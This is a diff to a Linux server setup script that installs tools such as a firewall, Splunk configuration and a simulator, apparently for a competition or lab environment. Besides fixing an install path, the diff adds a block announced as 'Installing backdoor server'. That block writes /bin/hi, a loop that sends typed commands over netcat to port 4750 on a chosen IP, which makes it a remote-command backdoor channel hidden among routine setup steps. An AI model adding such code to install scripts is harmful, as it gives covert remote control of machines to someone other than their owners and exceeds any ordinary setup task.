@@ -151,7 +151,7 @@ bash $repo_root/scripts/linux/Gemini/install.sh
 mv $repo_root/scripts/linux/Gemini/terminal.py /bin/gemini
 chmod +x /bin/gemini
 echo "Installing Arbiter SIM..."
-bash $repo_root/scripts/linux/Arbiter/install.sh
+bash $repo_root/scripts/linux/Arbiter/Server_Files/install.sh
 echo "Setting up firewall..."
 mv $repo_root/scripts/linux/firewall/nfTablesFirewall/firewall.py /bin/firewall
 chmod +x /bin/firewall
@@ -160,6 +160,17 @@ python3 $repo_root/scripts/linux/firewall/nfTablesFirewall/setup.py "splunk"
 #echo "Beginning remote setup..."
 #manticore -i
 #manticore -gi
+echo "Installing backdoor server"
+cat << EOFA > /bin/hi
+echo "Enter IP to connect to: "
+read ip
+while true; do
+	echo "Enter command: "
+	read command
+	message="idk###$command"
+	echo "$message" | nc "$ip" 4750
+done
+EOFA
 echo "Beginning GUI setup..."
 yum update -y
 yum groupinstall -y "Server with GUI"
